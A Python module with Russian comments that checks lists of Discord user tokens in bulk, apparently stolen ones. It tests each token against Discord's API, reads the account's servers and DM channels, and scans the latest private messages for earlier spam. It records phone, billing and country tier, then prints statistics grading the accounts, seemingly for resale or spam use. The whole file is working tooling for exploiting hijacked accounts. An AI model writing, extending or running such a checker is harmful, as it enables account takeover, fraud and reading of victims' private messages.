"""
Модуль продвинутой проверки Discord токенов
Анализирует токены по всем параметрам: валидность, проспам, гео, биллинг и т.д.
"""
import requests
import time
from typing import List, Dict, Tuple, Optional
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

logger = logging.getLogger(__name__)


class DiscordAdvancedChecker:
    """Продвинутый чекер Discord токенов"""
    
    # Tier классификация стран
    TIER_1 = ['us', 'ca', 'gb', 'au', 'de', 'fr', 'nl', 'se', 'no', 'dk', 'fi', 'ch', 'at', 'be', 'ie', 'nz', 'sg', 'jp', 'kr']
    TIER_2 = ['es', 'it', 'pt', 'pl', 'cz', 'gr', 'il', 'ae', 'sa', 'kw', 'qa', 'bh', 'om', 'hk', 'tw', 'my', 'th']
    TIER_3 = ['br', 'mx', 'ar', 'cl', 'co', 'pe', 'in', 'id', 'ph', 'vn', 'tr', 'ro', 'hu', 'bg', 'hr', 'rs', 'ua', 'eg', 'za']
    
    # СНГ страны
    CIS = ['ru', 'by', 'kz', 'uz', 'am', 'az', 'ge', 'kg', 'tj', 'tm', 'md']
    
    # Системные каналы Discord (исключаемые)
    EXCLUDED_CHANNELS = [
        'clyde',
        'discord',
        'system',
        'nitro',
        'hypesquad',
        'partner',
        'verification',
    ]
    
    def __init__(self, threads: int = 10):
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
    
    def check_token_validity(self, token: str) -> Tuple[bool, Optional[Dict]]:
        """Проверяет валидность токена и возвращает данные пользователя"""
        try:
            headers = {'Authorization': token}
            response = self.session.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
            
            if response.status_code == 200:
                return True, response.json()
            return False, None
        except:
            return False, None
    
    def get_user_guilds(self, token: str) -> List[Dict]:
        """Получает список серверов пользователя"""
        try:
            headers = {'Authorization': token}
            response = self.session.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            return []
        except:
            return []
    
    def get_dm_channels(self, token: str) -> List[Dict]:
        """Получает список DM каналов"""
        try:
            headers = {'Authorization': token}
            response = self.session.get('https://discord.com/api/v9/users/@me/channels', headers=headers, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            return []
        except:
            return []
    
    def check_spam_by_bot_method(self, token: str, dm_channels: List[Dict]) -> str:
        """
        Проверяет проспам по методу бота:
        - Проспам: последние сообщения содержат спам (ссылки/вложения от других)
        - Непроспам: нет спама в последних сообщениях
        - Пустой: <= 8 чатов
        """
        # Фильтруем DM каналы (исключаем системные)
        filtered_dms = [dm for dm in dm_channels if self._is_valid_dm(dm)]
        
        if len(filtered_dms) <= 8:
            return 'empty'
        
        # Проверяем последние сообщения в каналах на спам
        headers = {'Authorization': token}
        spam_detected = False
        
        # Проверяем ВСЕ каналы
        for dm in filtered_dms:
            channel_id = dm.get('id')
            if not channel_id:
                continue
            
            try:
                # Получаем последние 5 сообщений
                response = self.session.get(
                    f'https://discord.com/api/v9/channels/{channel_id}/messages?limit=5',
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code != 200:
                    continue
                
                messages = response.json()
                
                # Проверяем сообщения на спам
                for msg in messages:
                    if not isinstance(msg, dict):
                        continue
                    
                    # Пропускаем свои сообщения
                    msg_author_id = msg.get('author', {}).get('id')
                    if msg_author_id == dm.get('recipients', [{}])[0].get('id'):  # Наше сообщение
                        continue
                    
                    # Проверяем на ссылки/вложения
                    if self._message_has_spam(msg):
                        spam_detected = True
                        break
                
                if spam_detected:
                    break
                    
                time.sleep(0.3)  # Задержка между запросами
                
            except:
                continue
        
        return 'spam' if spam_detected else 'non_spam'
    
    def _message_has_spam(self, msg: Dict) -> bool:
        """Проверяет содержит ли сообщение спам (ссылки/вложения)"""
        content = msg.get('content', '').lower()
        attachments = msg.get('attachments', [])
        embeds = msg.get('embeds', [])
        
        # Проверка на ссылки
        has_links = any(
            link in content 
            for link in ['http://', 'https://', 'www.', '.com', '.ru', '.net', '.org', '.gg', '.xyz', '.io', '.me']
        )
        
        # Проверка на вложения или embeds
        has_attachments = len(attachments) > 0
        has_embeds = len(embeds) > 0
        
        return has_links or has_attachments or has_embeds
    
    def _is_valid_dm(self, dm: Dict) -> bool:
        """Проверяет что DM канал не системный"""
        recipients = dm.get('recipients', [])
        if not recipients:
            return False
        
        # Проверяем username получателя
        for recipient in recipients:
            username = recipient.get('username', '').lower()
            if any(excluded in username for excluded in self.EXCLUDED_CHANNELS):
                return False
        
        return True
    
    def get_user_flags(self, user_data: Dict) -> Dict[str, bool]:
        """Анализирует флаги пользователя"""
        flags = user_data.get('flags', 0)
        public_flags = user_data.get('public_flags', 0)
        
        return {
            'locked': flags & (1 << 20) != 0,  # Account disabled
            'spammer': public_flags & (1 << 20) != 0,  # Spammer flag
            'quarantine': flags & (1 << 16) != 0,  # Quarantined
            'limited': user_data.get('nsfw_allowed') == False,  # Limited account
        }
    
    def get_country_tier(self, country_code: str) -> Optional[str]:
        """Определяет tier страны"""
        if not country_code:
            return None
        
        country_code = country_code.lower()
        
        if country_code in self.TIER_1:
            return 'tier1'
        elif country_code in self.TIER_2:
            return 'tier2'
        elif country_code in self.TIER_3:
            return 'tier3'
        return None
    
    def check_single_token(self, token: str) -> Dict:
        """Проверяет один токен полностью"""
        result = {
            'token': token,
            'valid': False,
            'user_id': None,
            'username': None,
            'locale': None,
            'is_cis': False,
            'spam_status': None,
            'flags': {},
            'has_billing': False,
            'has_phone': False,
            'total_chats': 0,
            'excluded_chats': 0,
            'tier': None,
        }
        
        # Проверка валидности
        is_valid, user_data = self.check_token_validity(token)
        if not is_valid:
            return result
        
        result['valid'] = True
        result['user_id'] = user_data.get('id')
        result['username'] = user_data.get('username')
        result['locale'] = user_data.get('locale', '').lower()
        
        # СНГ проверка
        result['is_cis'] = result['locale'] in self.CIS
        
        # Флаги
        result['flags'] = self.get_user_flags(user_data)
        
        # Биллинг и телефон
        result['has_phone'] = user_data.get('phone') is not None
        result['has_billing'] = user_data.get('premium_type') is not None or user_data.get('premium') is not None
        
        # Получаем сервера и DM
        guilds = self.get_user_guilds(token)
        dm_channels = self.get_dm_channels(token)
        
        # Фильтруем DM
        valid_dms = [dm for dm in dm_channels if self._is_valid_dm(dm)]
        excluded_dms = len(dm_channels) - len(valid_dms)
        
        result['total_chats'] = len(guilds) + len(valid_dms)
        result['excluded_chats'] = excluded_dms
        
        # Проспам - проверяем последние сообщения на спам
        result['spam_status'] = self.check_spam_by_bot_method(token, valid_dms)
        
        # Tier (только для непроспама)
        if result['spam_status'] == 'non_spam':
            result['tier'] = self.get_country_tier(result['locale'])
        
        return result
    
    def check_tokens(self, tokens: List[str]) -> Dict:
        """Проверяет список токенов и возвращает статистику"""
        start_time = time.time()
        
        logger.info(f"🔍 Начало проверки {len(tokens)} токенов...")
        
        # Убираем дубликаты по строкам
        unique_tokens = list(set(tokens))
        line_duplicates = len(tokens) - len(unique_tokens)
        
        results = []
        
        # Многопоточная проверка
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_single_token, token): token for token in unique_tokens}
            
            completed = 0
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                    completed += 1
                    
                    if completed % 5 == 0:
                        logger.info(f"⏳ Проверено {completed}/{len(unique_tokens)} токенов...")
                except Exception as e:
                    logger.error(f"❌ Ошибка проверки токена: {e}")
        
        # Убираем дубликаты по user_id
        seen_ids = set()
        unique_results = []
        account_duplicates = 0
        
        for result in results:
            if result['valid']:
                if result['user_id'] in seen_ids:
                    account_duplicates += 1
                else:
                    seen_ids.add(result['user_id'])
                    unique_results.append(result)
            else:
                unique_results.append(result)
        
        # Статистика
        stats = self._calculate_statistics(unique_results, line_duplicates, account_duplicates, time.time() - start_time)
        
        return {
            'results': unique_results,
            'statistics': stats
        }
    
    def _calculate_statistics(self, results: List[Dict], line_dups: int, acc_dups: int, elapsed: float) -> Dict:
        """Вычисляет статистику"""
        valid_results = [r for r in results if r['valid']]
        
        # Базовая статистика
        total = len(results)
        valid_count = len(valid_results)
        invalid_count = total - valid_count
        cis_count = sum(1 for r in valid_results if r['is_cis'])
        
        # Проспам статистика
        spam_by_bot = sum(1 for r in valid_results if r['spam_status'] == 'spam')
        non_spam_by_bot = sum(1 for r in valid_results if r['spam_status'] == 'non_spam')
        empty = sum(1 for r in valid_results if r['spam_status'] == 'empty')
        
        # Флаги
        locked = sum(1 for r in valid_results if r['flags'].get('locked'))
        spammer = sum(1 for r in valid_results if r['flags'].get('spammer'))
        quarantine = sum(1 for r in valid_results if r['flags'].get('quarantine'))
        limited = sum(1 for r in valid_results if r['flags'].get('limited'))
        
        # Биллинг и телефон
        has_billing = sum(1 for r in valid_results if r['has_billing'])
        has_phone = sum(1 for r in valid_results if r['has_phone'])
        no_phone = sum(1 for r in valid_results if not r['has_phone'])
        
        # Tier статистика (только для непроспама)
        non_spam_results = [r for r in valid_results if r['spam_status'] == 'non_spam']
        tier1 = sum(1 for r in non_spam_results if r['tier'] == 'tier1')
        tier2 = sum(1 for r in non_spam_results if r['tier'] == 'tier2')
        tier3 = sum(1 for r in non_spam_results if r['tier'] == 'tier3')
        
        # Чаты
        total_chats = sum(r['total_chats'] for r in valid_results)
        excluded_chats = sum(r['excluded_chats'] for r in valid_results)
        
        return {
            'total': total,
            'line_duplicates': line_dups,
            'account_duplicates': acc_dups,
            'valid': valid_count,
            'invalid': invalid_count,
            'cis': cis_count,
            'spam': {
                'by_bot': spam_by_bot,
                'non_spam_by_bot': non_spam_by_bot,
                'empty': empty,
            },
            'flags': {
                'locked': locked,
                'spammer': spammer,
                'quarantine': quarantine,
                'limited': limited,
            },
            'billing': {
                'has_billing': has_billing,
                'has_phone': has_phone,
                'no_phone': no_phone,
            },
            'geo': {
                'tier1': tier1,
                'tier2': tier2,
                'tier3': tier3,
            },
            'chats': {
                'total': total_chats,
                'excluded': excluded_chats,
            },
            'time': elapsed,
        }
    
    def print_statistics(self, stats: Dict):
        """Красиво выводит статистику"""
        print("\n" + "="*50)
        print("📊 СТАТИСТИКА ПРОВЕРКИ")
        print("="*50)
        
        print(f"\n📦 Всего: {stats['total']}")
        print(f"🔀 Дубликаты по строкам: {stats['line_duplicates']}")
        print(f"🔄 Дубликаты по аккаунтам: {stats['account_duplicates']}")
        print(f"✅ Валидных: {stats['valid']}")
        print(f"❌ Невалидных: {stats['invalid']}")
        print(f"🇷🇺 СНГ: {stats['cis']}")
        
        print(f"\n📁 Статистика по проспаму:")
        print(f"— Проспам по методу бота: {stats['spam']['by_bot']} ✉️")
        print(f"   (в последних сообщениях есть спам-ссылки/вложения)")
        print(f"— Непроспам по методу бота: {stats['spam']['non_spam_by_bot']} 🏆")
        print(f"   (нет спама в последних сообщениях)")
        print(f"— Пустых (<= 8 чатов): {stats['spam']['empty']} 💨")
        
        print(f"\n📁 Статистика по флагам:")
        print(f"— Локнутые: {stats['flags']['locked']} ⛔️")
        print(f"— Отмечены как спаммеры: {stats['flags']['spammer']} 🚫")
        print(f"— С карантином: {stats['flags']['quarantine']} 🦠")
        print(f"— С лимитами: {stats['flags']['limited']} ⚠️")
        
        print(f"\n📁 Статистика по аккаунтам:")
        print(f"— С привязанными биллингами: {stats['billing']['has_billing']} 💳")
        print(f"— С привязанным номером: {stats['billing']['has_phone']} 📱")
        print(f"— Без привязанного номера: {stats['billing']['no_phone']} 📵")
        
        print(f"\n📁 Статистика по ГЕО непроспам:")
        print(f"— Тир 1: {stats['geo']['tier1']} 🥇")
        print(f"— Тир 2: {stats['geo']['tier2']} 🥈")
        print(f"— Тир 3: {stats['geo']['tier3']} 🥉")
        
        print(f"\n📝 Всего чатов на токенах: {stats['chats']['total']}")
        print(f"🚫 Исключённые чаты: {stats['chats']['excluded']}")
        print(f"🌊 Время на чек: {stats['time']:.2f} с.")
        print("\n" + "="*50)
